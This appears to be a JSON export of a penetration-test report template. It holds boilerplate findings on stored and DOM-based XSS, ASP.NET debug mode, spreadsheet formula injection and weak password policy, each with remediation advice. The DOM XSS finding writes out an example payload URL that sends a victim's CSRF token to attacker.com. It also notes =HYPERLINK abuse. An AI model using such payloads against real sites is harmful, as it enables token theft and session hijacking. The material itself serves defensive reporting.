{"practiceType":"Secure Development","selectedClient":"Standard","associated":[],"metadata":{"clientName":"Standard","clientAddress":"","appName":"","appDescription":"","testType":"Penetration Test - Essential","startDate":"","endDate":"","scope":"","scopeType":"","outOfScope":"","outOfScopeType":"","controlList":"","consultantName":"","consultantTitle":"","consultantNumber":"","consultantEmail":"","oversightName":"","oversightTitle":"Security Consultant","oversightNumber":"703-404-9293 x","oversightEmail":"@synopsys.com","clientManagerName":"","clientManagerTitle":"","clientManagerNumber":"703-404-9293 x","clientManagerEmail":"@synopsys.com","confidentiality":"","integrity":"","availability":"","hash":"671a150524115bebb83a413aff86231f28604a2ea04c930ae3cf27e531b78be4","versionNumber":"2019.03","isTWBAssessment":"false","testID":"","totalInstances":0,"pciReport":false,"retest":false},"findings":[{"identifier":33663,"name":"Stored Cross-Site Scripting (XSS)","description":"A Stored Cross-Site Scripting (XSS) vulnerability occurs when a web application sends stored strings that were provided by an attacker to a victim's browser in such a way that the browser executes part of the string as code. The string contains malicious data and is initially stored server-side, often in the application's database. The application later retrieves the malicious data and inserts it into a web page. This results in the victim's browser executing the attacker's code within a legitimate user's session.<br>Stored Cross-Site Scripting vulnerabilities give the attacker control of HTML and JavaScript running the user's browser. The attack can alter page content with malicious HTML or JavaScript code. The attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application. An often cited example use of a Stored Cross-Site is where the attacker sends himself/herself the victim's session identifier. With this session identifier, the attacker can then perform application functions using that user's identity for the duration of that session.","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"","remediation":"Stored Cross-Site Scripting (XSS) is prevented by encoding data before inserting it into the generated web page. Each character of the data is encoded and the result string is then inserted onto the generated web page. This technique of encoding values before inserting them on the web page is called \"Output Encoding\". Output Encoding libraries exist for most popular programming languages and frameworks.<br>\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:<br>\n<ul>\n<li>HTML Text Element</li>\n<li>HTML Attribute</li>\n<li>URL Parameter</li>\n<li>JavaScript Literal</li>\n<li>HTML Comment</li>\n<li>HTTP Header</li>\n<li>CSS Property\nFor example, the characters: &lt;, &gt;, \", ' are encoded as &amp;#60;, &amp;#62;, &amp;#34;, &amp;#39; for when those characters are inserted into an HTML Text Element. When those characters are inserted as a URL Parameter, the same characters are encoded as %3C, %3E, %22, %27.</li>\n</ul>\nLibraries for implementing the encoding schemes exist for most popular programming languages.<br>\n<ul>\n<li>OWASP Java Encoder: Java only<br></li>\n<li>Microsoft Web Protection Library: .NET languages<br></li>\n<li>Ruby - escapeHTML() - only supports HTML Text Encoding<br></li>\n<li>Jgencoder in JQuery: for preventing DOM-based XSS\nGreen field projects can consider the use of other technologies:<br></li>\n<li>Google Capabilities based JavaScript CAJA<br></li>\n<li>OWASP JXT- automatically encodes string data with the proper encoding\nInput validation is often recommended as a way to mitigate stored cross-site scripting. It is insufficient, however, because two separate applications are often involved: the first stores the malicious string and a second application generates the web page. The application generating the page cannot assume that the application storing the value has filtered out malicious data. In cases where a single application retrieves, stores, and redisplays data to the user, input validation can be used to prevent cross-site scripting only when the data has a strict syntactic format, such as numeric values and dates. Any application inputs which must accept arbitrary data would remain vulnerable.<br></li>\n</ul>","foundBy":"Manual","risk":{"type":"NIST","impact":"Critical","likelihood":"Critical","severity":"Critical"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"5","appscanTitle":"","itrc":"","cweId":"79","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.7 ","pciDesc":" Cross-site Scripting","flawCount":0},{"identifier":1639,"name":"DOM-Based Cross-Site Scripting","description":"DOM-based cross-site scripting (XSS) is a client-side injection issue where an attacker inserts a malicious script into the Document Object Model (DOM) modifying application's behavior. The DOM is a standardized programming interface that enables applications and scripts to dynamically update the structure, content, and layout of a web page.<br>\nIn a DOM-based XSS scenario, the attacker sends malicious strings to a victim's browser in such a way that the browser executes part of the string as code. The main difference between DOM-based and traditional, server-side XSS is that in a DOM-based XSS attack the payload (malicious string) is injected during runtime by the client, while in a traditional XSS it is injected into the application response during server-side processing and then sent to the browser.<br>\nThis vulnerability manifests itself throughout many different contexts. The application uses untrusted input in JavaScript methods and attributes that render HTML, such as:<br>\n<ul>\n<li>element.innerHTML - a property that sets or gets the HTML syntax describing the element's descendants.<br></li>\n<li>element.outerHTML - a property that sets or gets the HTML fragment describing the element and its descendants.\nThe application uses untrusted data in JavaScript contexts that may execute JavaScript dynamically, such as:<br></li>\n<li>eval - a function that evaluates its argument as JavaScript code.<br></li>\n<li>setTimeOut - a function that evaluates a string after a specified number of milliseconds.<br></li>\n<li>setInterval - a function that evaluates a string every specified number of milliseconds.<br></li>\n<li>new Function - a constructor that creates JavaScript functions dynamically.<br></li>\n<li>setAttribute - a function that sets an attribute on the specified element.<br></li>\n<li>document.write and document.writeln - functions that write a string to a document. The string may contain HTML tags, as well as a &lt;script&gt; tag with JavaScript code.<br></li>\n<li>any event handler, as they execute JavaScript.\nUntrusted input can come from many sources including (but not limited to):<br></li>\n<li>document.location - returns an object that contains information from the URI. The object also has methods for changing the URI or loading another URI for browser redirection.<br></li>\n<li>document.url - retrieves the URI as a string.<br></li>\n<li>document.referer - returns the URI that linked to the current page.\nThe example below is vulnerable to DOM-based XSS. The JavaScript code adds the error message from the fragment identifier (everything after #) to the page using the innerHTML property. <br></li>\n</ul>\n<code>&lt;p&gt;&lt;b id='err'&gt;&lt;/b&gt;&lt;/p&gt;\n&lt;input type=hidden id=_csrf value=\"wS2sCg7DA0\" /&gt;\n&lt;script&gt;document.getElementById('err').innerHTML = window.location.hash.substring(1);&lt;/script&gt;\n</code>\nIn a normal use case, a user fetches the page with a URL such as:<br>\n<code>https://example.com/updateItems.html#Item unavailable\n</code>\nNote that the browser does not send the fragment identifier to the server.<br>\nAn attacker can execute a DOM-based XSS attack against this page by sending the following URL to a victim:<br>\n<code>https://example.com/updateItems.html#&lt;svg/onload='document.write(\"&lt;img src=http://attacker.com/listentodata?token=\"+document.getElementById(\"_csrf\").value+\" /&gt;&lt;/img&gt;\")'&gt;\n</code>\nIn this case, the JavaScript code on the page adds the SVG tag to the 'err' element via the innerHTML property. Once the SVG tag is added, its 'onload' method is called. That method executes the event handler which writes an image tag to the page with the source attribute set to an attacker website. The source URL is dynamically created by concatenating the attacker's website URL and sensitive data from the victim's page, such as the value of the CSRF token stored in the element with the \"_csrf\" id. The element added to the page will look like the following.<br>\n<code>&lt;img src=\"http://attacker.com/listentodata?token=wS2sCg7DA0\"&gt;\n</code>\nWhen the browser adds the image tag, it tries to fetch the image from the provided URL. Therefore, the attacker's website receives a request exposing the victim's CSRF token in a GET parameter. <br>Like in traditional XSS vulnerabilities, an attacker can steal any sensitive information from the page, arbitrarily alter the page content, and execute application functions using the victim's identity if the victim is authenticated to the application.","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"","remediation":"Use the correct remediation approach depending on the JavaScript execution context. Similar to traditional XSS mitigations, DOM-based XSS is mitigated using output encoding and input validation. Output encoding technique should match the JavaScript execution context, such as HTML, HTML attribute, URL, etc. Contrary to the traditional XSS mitigation, in DOM-based XSS, some contexts cannot be mitigated with output encoding and, therefore, require input validation. In all cases, the mitigation must be done in the client-side code. <br>\nDifferent mitigation techniques apply to different JavaScript execution contexts:<br>\n<ul>\n<li>HTML context. Use the correct element property, such as textContent, innerText or outerText, so that the inserted data is automatically output-encoded by the browser. </li>\n<li>HTML attributes. When the setAttribute() function is used with untrusted data in both the name of the attribute and its value, use exact match to limit the attribute names that a user can set. These should only be safe attributes that do not execute JavaScript, such as 'align', 'alink', 'alt', 'value' and not event handlers or URI-type attributes. When untrusted data is used to set the value of the attribute, make sure that the attribute is not an event handler or a source. In addition, use input validation for the attribute's values, where appropriate (for example, for numeric values, such as 'width', 'height').</li>\n<li>URL context. Use the exact match approach or mapping. If the application must allow users to provide any URL, at the minimum, validate the schema of the URL to avoid XSS through redirects to 'javascript:' and 'data:' URLs. </li>\n<li>JavaScript context. Redesign the application so untrusted data is not used to dynamically create or modify JavaScript code. If redesign is not possible, use exact match or whitelisting, since JavaScript encoding will not mitigate an injection into a string that is dynamically evaluated by functions like eval(), new Function(), document.write(), or an event handler. \nRemember that server-side validation will not protect the application from DOM-based XSS because in DOM-based injections the payload is evaluated on the client side and not on the server side.</li>\n</ul>\nFor example, if untrusted data passed through the URL fragment must be added to the page, use the innerText property rather than innerHTML. In this case, if the data contains any HTML tags, they will be automatically encoded by the browser.<br>\n<code>&lt;p&gt;&lt;b id='err'&gt;&lt;/b&gt;&lt;/p&gt;\n&lt;input type=hidden id=_csrf value=\"wS2sCg7DA0\" /&gt;\n&lt;script&gt;document.getElementById('err').innerText = window.location.hash.substring(1);&lt;/script&gt;\n</code>","foundBy":"Manual","risk":{"type":"NIST","impact":"High","likelihood":"High","severity":"High"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"389","appscanTitle":"","itrc":"","cweId":"79","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.7 ","pciDesc":" Cross-site Scripting","flawCount":0},{"identifier":59966,"name":"ASP.NET Debugging Enabled","description":"ASP.NET debug mode is enabled for the application. Debug mode facilitates developer debugging by placing extra information in the application to help better monitor the application's execution. By default, debugging is disabled for ASP.NET applications.<br>Leaving ASP.NET debug mode enabled may result in leaked information about the application or server in use. In some cases, it may be possible to remotely trigger break-points in the .NET application, which may bring the entire system to a halt.<br>\nFor large applications, leaving debug enabled can affect availability in the following ways:<br>\n<ul>\n<li>Code will execute slower</li>\n<li>Pages will not timeout [1]</li>\n<li>Increase in memory consumption</li>\n<li>Scripts and images downloaded from the WebResources.axd handler are not cached</li>\n</ul>","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"In Web.config files, the application has enabled the debugging control. When the application is deployed, this allows the attacker to learn more about the technologies used, or potentially add break-points to the application and halt the entire system.<br>\n","remediation":"To disable debugging for a single application, set the debug attribute to false in the Web.config file<br>\n<code>&lt;compilation debug=\"false\" /&gt;\n</code>\nYou can also disable debug for every application on the system by modifying the Machine.config file. The following code will disable the &lt;compilation debug=\"true\"/&gt; switch:<br>\n<code>&lt;configuration&gt;\n    &lt;system.web&gt;\n          &lt;deployment retail=\"true\"/&gt;\n    &lt;/system.web&gt;\n&lt;/configuration&gt;\n</code>","foundBy":"Manual","risk":{"type":"NIST","impact":"Medium","likelihood":"Low","severity":"Low"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"97","appscanTitle":"","itrc":"","cweId":"11","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.8 ","pciDesc":" Improper Access Control","flawCount":0},{"identifier":96974,"name":"Formula Injection","description":"The application exports spreadsheet documents (e.g. .csv or .xls) containing untrusted user-supplied data. Programs such as Microsoft Excel or LibreOffice Calc make use of macro functions denoted by an equal sign prepended to the function name. Untrusted data inserted into spreadsheet data fields containing such syntax may be interpreted as formulas by a recipient's spreadsheet program and execute on the recipient's system.<br>\nAn attacker may include expressions to modify the content within the spreadsheet, and while the impact of changing this data is contingent on what data is present in the document, the overall goal would be to influence a victim's actions based on the modified data (e.g. altering market data to influence a victim's financial decisions).<br>\n\nAdditionally, an attacker may inject functions such as the =HYPERLINK(…) function to trick the victim into navigating to an attacker-controlled site or launching an executable on their local system, potentially leading to information leakage or complete system compromise.<br>\n","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"The application has a spreadsheet export functionality which contains user supplied untrusted data. Untrusted data inserted into spreadsheet can be treated as formula by the user's program leading to formula injection.<br>\n","remediation":"Escape all untrusted input before inserting it into spreadsheet data fields. In Microsoft Excel, this is accomplished by placing a single-quote before the content. For example, the following string will be treated as plain text rather than a formula: '=HYPERLINK(…)<br>\n","foundBy":"Manual","risk":{"type":"NIST","impact":"Critical","likelihood":"Medium","severity":"High"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"388","appscanTitle":"","itrc":"","cweId":"77","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.1 ","pciDesc":" Injection Flaws","flawCount":0},{"identifier":81995,"name":"Weak Password Policy","description":"The application does not enforce a strong password policy to prevent malicious users from manually guessing or brute-forcing legitimate account passwords. Weak password policies include those that allow passwords consisting of common dictionary words, commonly-used passwords (e.g., 1234), known compromised passwords, passwords that contain the associated username, sequential characters, and passwords shorter than 8 characters. By allowing users to create easily-guessable passwords, an attacker with minimal knowledge of registered users and username formats could crack passwords through the use of any of several techniques. In an online attack, an attacker can use consecutive login attempts to determine simple passwords. In an offline attack (e.g., if the attacker has gained access to the raw contents of the password database through some other means), the attacker can employ richer techniques such as pre-computed hash attacks, free of rate-limiting and account-locking protections that might be employed against online password brute-forcing attacks.<br>Weak passwords may be easily guessed.  This increases the likelihood a user's account may be compromised by an attacker. Once compromised, an attacker will have full access to the victim's account, potentially including the ability to modify settings, features and passwords. If the target account holds administrative privileges, the attacker may be able to modify data for other users and/or the entire system. Due to the prevalence of password reuse, a compromised password may also provide an attacker with credentials that can be used to attack other systems the victim uses the same credentials to access.","note":"","instances":[],"systemic":"false","fixLocation":null,"screenshots":[],"stepsToReproduce":"","likelihoodDescription":"","impactDescription":"","contextDescription":"The application accepts passwords with minimum length 6 characters and is not checking any password restrictions. Such passwords could be easily enumerated by attackers. It is best practice to accept the passwords with minimum length 9 characters or more, containing special and alphanumeric characters.<br>\n","remediation":"Implement a strong password policy. A strong password policy is one which combines rules to prevent easily-guessable passwords from being used while also ensuring that passwords contain sufficient entropy. This will minimize the likelihood that an attack will be successful if an attacker attempts to guess commonly-used passwords or employs an automated dictionary attack against a particular user.\nIn the event that company policy does not stipulate password requirements, or the existing requirements are weak, consider employing the following password requirements:<br>\n<ul>\n<li>Passwords must be at least eight (8) characters long.</li>\n<li>The application must compare the end user's selected password against a list of commonly used, expected or compromised passwords. This list may include but is not limited to : dictionary words, commonly-used passwords, repetitive or sequential characters, context specific words, and passwords that have been compromised in a known data breach. The application must reject the user's password if it is found in the list and provide a reason for rejection to the user.</li>\n<li>The application must generate at least six (6) characters long passwords when creating temporary passwords such as first time login passwords. The user must be required to update their passwords next time they login. </li>\n<li>The application must enforce password change if there is evidence of compromise.</li>\n</ul>\nIn addition, Synopsys also recommends following best practices:<br>\n<ul>\n<li>The application should allow at least 64 characters long passwords and must not perform truncation.</li>\n<li>The application should provide a password strength meter to assist the user in choosing a strong password.</li>\n</ul>\nPlease refer, Section 5.1.1. Memorized Secret and Appendix A--Strength of Memorized Secrets of NIST Special Publication 800-63B (https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-63b.pdf) for additional details.","foundBy":"Manual","risk":{"type":"NIST","impact":"High","likelihood":"Medium","severity":"Medium"},"bnySeverityRiskLevels":["--select severity--","Critical","High","Medium","Low","Informational"],"cvdId":"26","appscanTitle":"","itrc":"","cweId":"521","cweIdFlawName":"","cweIdCategory":"","pciId":"6.5.10 ","pciDesc":" Broken Authentication and Session Management","flawCount":0}],"customFields":[{"name":"assessmentNotes","label":"Assessment Notes","fieldType":"textarea","value":""}],"riskType":"NIST5","billable":"true","sdr":"false","priorTestingFlag":"false","generatedBy":"tort","totalUploadedFileSize":0}